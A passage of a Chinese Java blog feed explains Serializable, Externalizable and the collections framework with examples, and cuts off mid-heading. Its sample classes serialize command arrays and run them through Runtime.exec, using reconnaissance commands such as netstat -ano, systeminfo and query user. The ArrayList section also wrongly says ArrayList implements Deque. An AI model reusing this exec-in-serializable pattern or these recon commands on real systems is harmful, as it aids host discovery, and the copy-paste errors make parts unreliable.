{...}</code>来进行判断某个对象是否是标记类的实例化，然后再去进行一些操作。</p><p>重要知识点：</p><ol><li>java.io.Serializable仅用于<strong>标识</strong>类的可序列化，它没有任何方法或字段</li><li>序列化运行时将每个可序列化的类与称为serialVersionUID的版本号相关联， 因为可能这个类可能存在新旧版本, 所以使用该标记来标明。如果收发方的这个类版本不一致, 在反序列化 (<code>deserialization</code>) 的时候就会抛出<code>InvalidClassException</code>异常。其修饰符是<code>static final long</code>。注意写代码时可以用IDEA来自动生成serialVersionUID</li><li>只要实现了Serializable，它的<strong>所有子类都是可序列化的</strong>，子类会直接父类的继承writeObject和readObject，注意反序列化时不会调用父类的构造器</li><li>父类不可序列化，子类声明该接口，要想<strong>序列化父类信息</strong>子类必须重写writeObject和readObject方法，将可访问的父类信息序列化（原因：对象反序列化时，如果父类未实现序列化接口，则反序列出的对象会再次调用父类的构造函数来完成属于父类那部分内容的初始化）</li></ol><h3 id="Externalizable序列化接口"><a href="#Externalizable序列化接口" class="headerlink" title="Externalizable序列化接口"></a>Externalizable序列化接口</h3><p>Externalizable接口是继承于Serializable接口的. 它仅定义了两个方法分别用于控制序列化和反序列化过程。通过Externalizable我们可以控制哪些对象及属性能够序列化，并且能够控制其按照代码出现<strong>顺序</strong>进行序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>;。</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">//https://blog.csdn.net/liwenshui322/article/details/47145191</span></span><br><span class="line"><span class="comment">//通过实现Externalizable接口练习控制对象序列化和反序列</span></span><br><span class="line"><span class="comment">/*首先，我们在序列化对象的时候，由于这个类实现了Externalizable 接口，在writeExternal()方法里定义了哪些属性可以序列化，</span></span><br><span class="line"><span class="comment">哪些不可以序列化，所以，对象在经过这里就把规定能被序列化的序列化保存文件，不能序列化的不处理，</span></span><br><span class="line"><span class="comment">然后在反序列的时候自动调用readExternal()方法，根据序列顺序挨个读取进行反序列，并自动封装成对象返回，然后在测试类接收，就完成了反序列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestExternalizable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TestExternalizable testExternalizable = <span class="keyword">new</span> TestExternalizable();</span><br><span class="line">        testExternalizable.objToStream();</span><br><span class="line">        testExternalizable.streamToObj();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">objToStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        MyExternalizable myExternalizable = <span class="keyword">new</span> MyExternalizable(<span class="number">1</span>,<span class="number">2</span>,<span class="string">"3"</span>);</span><br><span class="line">        <span class="comment">// .ser是Java序列化文件标准后缀</span></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\1.ser"</span>));</span><br><span class="line">        objectOutputStream.writeObject(myExternalizable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">streamToObj</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.ser"</span>));</span><br><span class="line">        MyExternalizable myExternalizable = (MyExternalizable) objectInputStream.readObject();</span><br><span class="line">        System.out.println(myExternalizable.toString());</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyExternalizable</span> <span class="keyword">implements</span> <span class="title">Externalizable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> String c = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyExternalizable</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, String c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.a = a;</span><br><span class="line">        <span class="keyword">this</span>.b = b;</span><br><span class="line">        <span class="keyword">this</span>.c = c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyExternalizable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当序列化对象时,该方法自动调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"序列化..."</span>);</span><br><span class="line">        <span class="comment">//可以在序列化时写非自身的属性</span></span><br><span class="line">        Date d = <span class="keyword">new</span> Date();</span><br><span class="line">        out.writeObject(d);</span><br><span class="line">        <span class="comment">//只序列化a、c属性</span></span><br><span class="line">        out.writeObject(a);</span><br><span class="line">        out.writeObject(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当反序列化为对象时,该方法自动调用.反序列化会按照序列化顺序来</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//依次反序列化</span></span><br><span class="line">        System.out.println(<span class="string">"反序列化..."</span>);</span><br><span class="line">        Date d = (Date) in.readObject();</span><br><span class="line">        System.out.println(d.getTime());</span><br><span class="line">        <span class="comment">//只反序列化a、c属性</span></span><br><span class="line">        <span class="keyword">this</span>.a = (Integer) in.readObject();</span><br><span class="line">        <span class="keyword">this</span>.c = (String) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"a:"</span>+ a +<span class="string">" b:"</span> + b + <span class="string">" c:"</span> + c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="/imgs/image-20210629212035118.png" alt="image-20210629212035118"></p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.jianshu.com/p/729c15e14d76" target="_blank" rel="noopener">https://www.jianshu.com/p/729c15e14d76</a><br><a href="https://blog.csdn.net/liwenshui322/article/details/47145191" target="_blank" rel="noopener">https://blog.csdn.net/liwenshui322/article/details/47145191</a><br><a href="https://blog.csdn.net/weixin_30485291/article/details/98134295" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30485291/article/details/98134295</a><br><a href="https://www.cnblogs.com/youxin/archive/2013/06/04/3116304.html" target="_blank" rel="noopener">https://www.cnblogs.com/youxin/archive/2013/06/04/3116304.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDK序列化机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础之集合框架</title>
      <link href="2021/06/06/Java%E5%9F%BA%E7%A1%80%E4%B9%8B%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/"/>
      <url>2021/06/06/Java%E5%9F%BA%E7%A1%80%E4%B9%8B%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/image-20210607181445201.png" alt="image-20210607181445201"></p><h3 id="一、基本概念："><a href="#一、基本概念：" class="headerlink" title="一、基本概念："></a>一、基本概念：</h3><p>集合可以看作是一种容器，用来<strong>存储对象信息</strong>。所有集合类都位于java.util包下，但支持多线程的集合类位于java.util.concurrent包下。</p><p>数组与集合的区别如下：</p><ul><li>数组长度不可变化，集合类长度可变、用于保存数量不确定的数据；</li><li>树组无法保存具有映射关系的数据，集合可以保存具有映射关系的数据；</li><li>数组元素既可以是基本类型的值，也可以是对象；集合只能保存对象。</li></ul><p>Java集合类主要由两个根接口<strong>Collection和Map</strong>派生出来的，Collection派生出了三个子接口：List、Set、Queue（Java5新增的队列），因此Java集合大致也可分成List、Set、Queue、Map四种接口体系，（注意：Map不是Collection的子接口）。其中List代表了有序可重复集合，可直接根据元素的索引来访问；Set代表无序不可重复集合，只能根据元素本身来访问；Queue是队列集合；Map代表的是存储key-value对的集合，可根据元素的key来访问value。</p><p>【以上概念来自：<a href="https://www.cnblogs.com/bingyimeiling/p/10255037.html" target="_blank" rel="noopener">Java集合框架详解（全）</a>】</p><h3 id="二、Collection"><a href="#二、Collection" class="headerlink" title="二、Collection"></a>二、Collection</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Collection</span><br><span class="line">|__List（有序可重复）</span><br><span class="line">||__ArrayList</span><br><span class="line">||__LinkedList（常用）</span><br><span class="line">||__Vector</span><br><span class="line">||__Stack</span><br><span class="line">|__Set（无序不重复）</span><br><span class="line">||__HashSet（常用）</span><br><span class="line">||__TreeSet</span><br><span class="line">|__Queue</span><br><span class="line">|__Deque</span><br><span class="line">||__ArrayDeque</span><br><span class="line">|__PriorityQueue</span><br></pre></td></tr></table></figure><h4 id="1、Collection"><a href="#1、Collection" class="headerlink" title="1、Collection"></a>1、Collection</h4><p>Collection 是最基本的集合接口，一个 Collection 代表一组 Object，即 Collection 的元素，Java不提供直接继承自Collection的类，只提供继承于的子接口(如List和set)。</p><p>方法：</p><table><thead><tr><th>返回类型</th><th align="left">方法名及描述</th></tr></thead><tbody><tr><td>boolean</td><td align="left">add(E e): 确保此集合包含指定的元素（可选操作）。</td></tr><tr><td>boolean</td><td align="left">addAll(Collection&lt;? extends E&gt; c): 将指定集合中的所有元素添加到此集合（可选操作）。</td></tr><tr><td>void</td><td align="left">clear(): 从此集合中删除所有元素（可选操作）。</td></tr><tr><td>boolean</td><td align="left">contains(Object o): 如果此集合包含指定的元素，则返回 true 。</td></tr><tr><td>boolean</td><td align="left">containsAll(Collection&lt;?&gt; c): 如果此集合包含指定 集合中的所有元素，则返回true。</td></tr><tr><td>boolean</td><td align="left">equals(Object o): 将指定的对象与此集合进行比较以获得相等性。</td></tr><tr><td>int</td><td align="left">hashCode(): 返回此集合的哈希码值。</td></tr><tr><td>boolean</td><td align="left">isEmpty(): 如果此集合不包含元素，则返回 true 。</td></tr><tr><td>Iterator<E></td><td align="left">iterator(): 返回此集合中的元素的迭代器。</td></tr><tr><td>default Stream<E></td><td align="left">parallelStream(): 返回可能并行的 Stream与此集合作为其来源。</td></tr><tr><td>boolean</td><td align="left">remove(Object o): 从该集合中删除指定元素的单个实例（如果存在）（可选操作）。</td></tr><tr><td>boolean</td><td align="left">removeAll(Collection&lt;?&gt; c): 删除指定集合中包含的所有此集合的元素（可选操作）。</td></tr><tr><td>default boolean</td><td align="left">removeIf(Predicate&lt;? super E&gt; filter): 删除满足给定谓词的此集合的所有元素。</td></tr><tr><td>boolean</td><td align="left">retainAll(Collection&lt;?&gt; c): 仅保留此集合中包含在指定集合中的元素（可选操作）。</td></tr><tr><td>int</td><td align="left">size(): 返回此集合中的元素数。</td></tr><tr><td>default Spliterator<E></td><td align="left">spliterator(): 创建一个Spliterator在这个集合中的元素。</td></tr><tr><td>default Stream<E></td><td align="left">stream(): 返回以此集合作为源的顺序 Stream 。</td></tr><tr><td>Object[]</td><td align="left">toArray(): 返回一个包含此集合中所有元素的数组。</td></tr><tr><td><T> T[]</td><td align="left">toArray(T[] a): 返回包含此集合中所有元素的数组; 返回的数组的运行时类型是指定数组的运行时类型。</td></tr></tbody></table><h4 id="2、List"><a href="#2、List" class="headerlink" title="2、List"></a>2、List</h4><p>List接口是一个<strong>有序</strong>的 Collection，使用此接口能够精确的控制每个元素插入的位置，能够通过索引(元素在List中位置，类似于数组的下标)来访问List中的元素，第一个元素的索引为 0，而且允许<strong>有相同的元素</strong>。</p><p>List 特点：有索引、顺序存储、可重复</p><h5 id="2-1-ArrayList"><a href="#2-1-ArrayList" class="headerlink" title="2.1 ArrayList"></a>2.1 ArrayList</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class ArrayList&lt;E&gt;</span><br><span class="line">extends AbstractList&lt;E&gt;</span><br><span class="line">implements List&lt;E&gt;, RandomAccess, Cloneable, Serializable</span><br></pre></td></tr></table></figure><p>ArrayList：（java.util.ArrayList）ArrayList可以看作动态数组，底层数组实现的，相当于Array的复杂版本，它提供了动态的增加和减少元素，实现了ICollection和IList接口，灵活的设置数组的大小等好处</p><p>特点：查询快，增删慢(多线程)</p><ul><li>ArrayList 实现 List 接口，所以能对它进行队列操作</li><li>ArrayList 实现 Deque 接口，能将LinkedList当作双端队列使用</li><li>ArrayList 实现了Cloneable接口，即覆盖了函数clone()，能克隆</li><li>ArrayList 实现了RandomAccess接口，可以快速随机存取，提高查询效率。</li><li>LinkedList 实现java.io.Serializable接口，所以LinkedList支持序列化，能通过序列化去传输</li></ul><p>常用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add()：追加元素</span><br><span class="line">remove()：删除元素</span><br><span class="line">contains()：判断是否包含元素</span><br><span class="line">size()：元素个数</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Test test = <span class="keyword">new</span> Test();</span><br><span class="line">        test.arrayListTest();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">arrayListTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ArrayList&lt;Person&gt; personArrayList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"netstat"</span>,<span class="string">"-ano"</span>&#125;);</span><br><span class="line">        personArrayList.add(<span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"ipconfig"</span>, <span class="string">"/a"</span>&#125;));</span><br><span class="line">        personArrayList.add(person);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"--------------------------------------可通过索引获取----------------------------------"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; personArrayList.size(); i++) &#123;</span><br><span class="line">            Person p = personArrayList.get(i);</span><br><span class="line">            p.run();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"--------------------------------------可通过迭代器获取--------------------------------"</span>);</span><br><span class="line">        Iterator&lt;Person&gt; iterator = personArrayList.listIterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">            Person p = iterator.next();</span><br><span class="line">            p.run();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"--------------------------------------可通过foreach获取--------------------------------"</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">for</span> (Person p : personArrayList) &#123;</span><br><span class="line">            p.run();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"是否包含person? "</span> + personArrayList.contains(person));</span><br><span class="line">        System.out.println(<span class="string">"是否包含p? "</span> + personArrayList.contains(<span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"netstat"</span>,<span class="string">"-ano"</span>&#125;)));</span><br><span class="line">        System.out.println(<span class="string">"移除第2个元素"</span>);</span><br><span class="line">        personArrayList.remove(<span class="number">1</span>);</span><br><span class="line">        System.out.println(<span class="string">"移除后长度： "</span> + personArrayList.size());</span><br><span class="line">        personArrayList.clear();</span><br><span class="line">        System.out.println(<span class="string">"清除后长度： "</span> + personArrayList.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String[] cmd;</span><br><span class="line"></span><br><span class="line">    Person(String[] cmd) &#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">//获取当前程序环境</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Process process = runtime.exec(<span class="keyword">this</span>.cmd);</span><br><span class="line">        <span class="comment">//用缓冲区读取执行结果</span></span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">        String s;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (String x : cmd) &#123;</span><br><span class="line">            stringBuffer.append(x);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"**********************执行命令："</span> + stringBuffer + <span class="string">"********************************"</span>);</span><br><span class="line">        <span class="keyword">while</span> ((s = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-2-LinkedList"><a href="#2-2-LinkedList" class="headerlink" title="2.2 LinkedList"></a>2.2 LinkedList</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public class LinkedList&lt;E&gt;</span><br><span class="line">extends AbstractSequentialList&lt;E&gt;</span><br><span class="line">implements List&lt;E&gt;, Deque&lt;E&gt;, Cloneable, Serializable</span><br></pre></td></tr></table></figure><p>特点：</p><p>底层链表实现的、查询慢、增删快</p><ul><li>LinkedList的本质是<strong>双向链表</strong>，继承于AbstractSequentialLis</li><li>LinkedList 可以被当作<strong>堆栈、队列或双端队列</strong>进行操作</li><li>LinkedList 实现 List 接口，所以能对它进行队列操作</li><li>LinkedList 实现 Deque 接口，能将LinkedList当作双端队列使用</li><li>LinkedList 实现了Cloneable接口，即覆盖了函数clone()，能克隆</li><li>LinkedList 实现java.io.Serializable接口，所以LinkedList支持序列化，能通过序列化去传输</li><li>LinkedList 是非同步的。</li></ul><p>常用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add()：添加元素</span><br><span class="line">addFirst()：在该列表开头插入指定的元素。 </span><br><span class="line">addLast()：将指定的元素追加到此列表的末尾 </span><br><span class="line">getFirst()：返回此列表中的第一个元素。</span><br><span class="line">getLast()：返回此列表中的最后一个元素。</span><br><span class="line">removeFirst()：从此列表中删除并返回第一个元素。</span><br><span class="line">removeLast()：从此列表中删除并返回最后一个元素。</span><br><span class="line">descendingIterator()：以相反的顺序返回此deque中的元素的迭代器</span><br><span class="line">element()：检索但不删除此列表的头（第一个元素）</span><br><span class="line">pop()：从此列表表示的堆栈中弹出一个元素。  </span><br><span class="line">push()：将元素推送到由此列表表示的堆栈上。  </span><br><span class="line">remove()：删除元素。</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedListTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        LinkedListTest linkedListTest = <span class="keyword">new</span> LinkedListTest();</span><br><span class="line">        linkedListTest.linkedListTest();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">linkedListTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        LinkedList&lt;Person&gt; linkedList = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"query"</span>,<span class="string">"user"</span>&#125;);</span><br><span class="line">        linkedList.add(person);</span><br><span class="line">        linkedList.add(<span class="number">0</span>,<span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"systeminfo"</span>&#125;));</span><br><span class="line">        linkedList.push(<span class="keyword">new</span> Person(<span class="keyword">new</span> String[]&#123;<span class="string">"netstat"</span>,<span class="string">"-ano"</span>&#125;));</span><br><span class="line"></span><br><span class="line">        Iterator&lt;Person&gt; iterator = linkedList.listIterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">            iterator.next().run();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"———————————————————————————————————————————常用方法测试—————————————————————————————————————————"</span>);</span><br><span class="line">        Person p1 = linkedList.getFirst();</span><br><span class="line">        System.out.println(p1.cmd);</span><br><span class="line">        System.out.println(linkedList.size());</span><br><span class="line">        Person p2 = linkedList.pop();</span><br><span class="line">        System.out.println(p2.cmd);</span><br><span class="line">        System.out.println(linkedList.size());</span><br><span class="line">        System.out.println(p1==p2);</span><br><span class="line">        Person p3 = linkedList.removeLast();</span><br><span class="line">        System.out.println(p3.cmd);</span><br><span class="line">        System.out.println(linkedList.size());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"——————————————————————————————————————————————序列化测试——————————————————————————————————————"</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">        objectOutputStream.writeObject(linkedList);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"E:\\1.txt"</span>));</span><br><span class="line">        LinkedList&lt;Person&gt; linkedList1 = (LinkedList&lt;Person&gt;) objectInputStream.readObject();</span><br><span class="line">        System.out.println(linkedList1.size());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="2-3-ArrayList和LinkedList使用场景"><a href="#2-3-ArrayList和LinkedList使用场景" class="headerlink" title="2.3 ArrayList和LinkedList使用场景"></a>2.3 